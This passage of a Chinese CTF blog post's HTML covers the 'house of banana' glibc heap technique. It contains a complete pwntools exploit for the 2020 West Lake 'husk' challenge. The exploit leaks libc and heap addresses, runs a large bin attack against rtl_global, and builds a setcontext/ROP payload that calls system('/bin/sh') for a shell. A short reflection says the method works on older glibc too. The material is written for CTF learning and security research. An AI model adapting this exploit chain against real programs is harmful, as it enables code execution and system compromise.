class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./husk&#x27;,env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">#sh = remote(&#x27;100.1.0.111&#x27;,9999)</span><br><span class="line"></span><br><span class="line">def add(size,content = &#x27;&#x27;):</span><br><span class="line">   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)</span><br><span class="line">   sh.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line">   if content != &#x27;&#x27;:</span><br><span class="line">      sh.sendafter(&#x27;Content:&#x27;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)</span><br><span class="line">   sh.sendlineafter(&#x27;Index:&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)</span><br><span class="line">   sh.sendlineafter(&#x27;Index:&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)</span><br><span class="line">   sh.sendlineafter(&#x27;Index:&#x27;,str(index))</span><br><span class="line">   sh.sendafter(&#x27;Content:&#x27;,content)</span><br><span class="line"></span><br><span class="line">add(0x520,&#x27;a&#x27;*0x520) #0</span><br><span class="line">add(0x428,&#x27;b&#x27;*0x428) #1</span><br><span class="line">add(0x500,&#x27;c&#x27;*0x500) #2</span><br><span class="line">add(0x420,&#x27;d&#x27;*0x420) #3</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">add(0x600,&#x27;c&#x27;*0x600) #4</span><br><span class="line">add(0x600,&#x27;c&#x27;*0x600) #5</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = main_arena_xx - 0x1eb010</span><br><span class="line">print &#x27;libc_base=&#x27;,hex(libc_base)</span><br><span class="line">global_max_fast = libc_base + 0x1edb78</span><br><span class="line">print &#x27;global_max_fast=&#x27;,hex(global_max_fast)</span><br><span class="line">rtl_global = libc_base + 0x220060</span><br><span class="line">print &#x27;rtl_global=&#x27;,hex(rtl_global)</span><br><span class="line">set_context = libc_base + libc.sym[&#x27;setcontext&#x27;] + 0x3D</span><br><span class="line">ret = libc_base + libc.sym[&#x27;setcontext&#x27;] + 0x14E</span><br><span class="line">pop_rdi = libc_base + 0x00000000000277e9</span><br><span class="line">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">system_addr =  libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">#print hex(libc_base + 0x2043ac)</span><br><span class="line">edit(0,&#x27;a&#x27;*0x10)</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil(&#x27;a&#x27;*0x10)</span><br><span class="line">heap_addr = u64(sh.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print &#x27;heap_addr=&#x27;,hex(heap_addr)</span><br><span class="line">edit(0,p64(main_arena_xx)*2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#未归位的large bin</span><br><span class="line">delete(2)</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">#控制large bin的bk</span><br><span class="line">edit(0,p64(0) + p64(0) + p64(0) + p64(rtl_global - 0x20))</span><br><span class="line">#raw_input()</span><br><span class="line">add(0x600,&#x27;large bin attack!!&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(0) + p64(libc_base + 0x221730) + p64(0) + p64(heap_addr + 0x960)</span><br><span class="line">payload += p64(set_context) + p64(ret)</span><br><span class="line"></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += &#x27;\x00&#x27;*0x80</span><br><span class="line"></span><br><span class="line">payload += p64(heap_addr + 0x960 + 0x28 + 0x18)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload = payload.ljust(0x100,&#x27;\x00&#x27;)</span><br><span class="line">payload += p64(heap_addr + 0x960 + 0x10 + 0x110)*0x3</span><br><span class="line">payload += p64(0x10)</span><br><span class="line">payload = payload.ljust(0x31C - 0x10,&#x27;\x00&#x27;)</span><br><span class="line">payload += p8(0x8)</span><br><span class="line">edit(2,payload)</span><br><span class="line"></span><br><span class="line">edit(1,&#x27;b&#x27;*0x420 + p64(heap_addr + 0x960 + 0x20))</span><br><span class="line"></span><br><span class="line">#getshell</span><br><span class="line">sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;5&#x27;)</span><br><span class="line">sh.sendlineafter(&#x27;name:&#x27;,&#x27;haivk&#x27;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="0x06-感想"><a href="#0x06-感想" class="headerlink" title="0x06 感想"></a>0x06 感想</h2><p>house of banana将会是一种新型的利用手法，且向下兼容老版本glibc。其实只要能实现往任意地址写一个堆地址，都可以利用这种方法。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" rel="tag"># 堆风水</a>
+              <a href="/ha1vk/tags/linkmap/" rel="tag"># linkmap</a>
+              <a href="/ha1vk/tags/house-of-banana/" rel="tag"># house of banana</a>
+              <a href="/ha1vk/tags/glibc-2-28/" rel="tag"># glibc >= 2.28</a>
+              <a href="/ha1vk/tags/large-bin-attack/" rel="tag"># large bin attack</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/12/06/roarctf2020-2a1/" rel="prev" title="roarctf2020_2a1">
+      <i class="fa fa-chevron-left"></i> roarctf2020_2a1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/12/10/RealWorldCTF-Quals-2019-accessible/" rel="next" title="从RealWorldCTF Quals 2019 - accessible学习V8对property access的优化">
+      从RealWorldCTF Quals 2019 - accessible学习V8对property access的优化 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%96%B0%E7%89%88glibc%E7%9A%84%E6%94%B9%E8%BF%9B"><span class="nav-number">2.</span> <span class="nav-text">0x02 新版glibc的改进</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-large-bin-attack%E5%9C%A8%E6%96%B0%E7%89%88glibc%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">0x03 large bin attack在新版glibc中的利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-house-of-banana"><span class="nav-number">4.</span> <span class="nav-text">0x04 house of banana</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%88%E6%BB%A1%E8%B6%B3%E4%BB%BB%E4%B8%80%E6%9D%A1%E4%BB%B6%E5%8D%B3%E5%8F%AF%EF%BC%89%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">适用场景（满足任一条件即可）：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%A8%8B%E5%BA%8F%E8%83%BD%E5%A4%9F%E6%98%BE%E5%BC%8F%E7%9A%84%E6%89%A7%E8%A1%8Cexit%E5%87%BD%E6%95%B0"><span class="nav-number">4.1.1.</span> <span class="nav-text">1.程序能够显式的执行exit函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%A8%8B%E5%BA%8F%E9%80%9A%E8%BF%87libc-start-main%E5%90%AF%E5%8A%A8%E7%9A%84%E4%B8%BB%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%94%E4%B8%BB%E5%87%BD%E6%95%B0%E8%83%BD%E5%A4%9F%E7%BB%93%E6%9D%9F"><span class="nav-number">4.1.2.</span> <span class="nav-text">2.程序通过libc_start_main启动的主函数，且主函数能够结束</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc"><span class="nav-number">4.3.</span> <span class="nav-text">poc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%AE%9E%E4%BE%8B%E5%BA%94%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">0x05 实例应用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020%E5%86%B3%E8%B5%9B-husk"><span class="nav-number">5.1.</span> <span class="nav-text">西湖论剑2020决赛 husk</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">5.1.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%84%9F%E6%83%B3"><span class="nav-number">6.</span> <span class="nav-text">0x06 感想</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
